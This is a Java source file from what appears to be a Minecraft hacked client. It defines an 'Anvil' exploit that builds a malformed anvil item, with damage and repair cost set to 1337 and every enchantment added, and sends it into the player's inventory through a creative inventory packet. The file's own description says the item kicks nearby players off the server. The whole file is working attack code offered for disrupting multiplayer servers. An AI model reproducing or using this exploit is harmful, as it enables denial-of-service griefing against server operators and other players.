package wtf.norma.nekito.exploit.impl.creative;

import net.minecraft.enchantment.Enchantment;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.network.NetHelper;

@ExploitInfo(
        name = "Anvil",
        type = ExploitType.CREATIVE,
        description = "After placing the anvil, players which are near to it will get kicked from the server with you."
)
public class AnvilExploit extends Exploit<ItemStack> {

    public AnvilExploit() {
        super(() -> {
            ItemStack itemStack = new ItemStack(Blocks.anvil);
            itemStack.setItemDamage(1337);
            itemStack.setRepairCost(1337);

            for (Enchantment enchantment : Enchantment.enchantmentsList) {
                if (enchantment != null) {
                    itemStack.addEnchantment(enchantment, 1);
                }
            }

            itemStack.setStackDisplayName("Thicc anvil");
            return itemStack;
        });
    }

    @Override
    public void execute(Object... args) {
        if (!mc.thePlayer.capabilities.isCreativeMode) {
            throw new ExploitException("This exploit will only work on creative.");
        }

        for (int i = 0; i < 9; i++) {
            if (mc.thePlayer.inventory.getStackInSlot(i) == null) {
                NetHelper.sendPacket(new C10PacketCreativeInventoryAction(36, exploitSource().get()));
                mc.thePlayer.closeScreen();
                ChatHelper.printMessage("Added anvil to your inventory.");
                return;
            }
        }

        throw new ExploitException("Can't add anvil to your inventory.");
    }
}
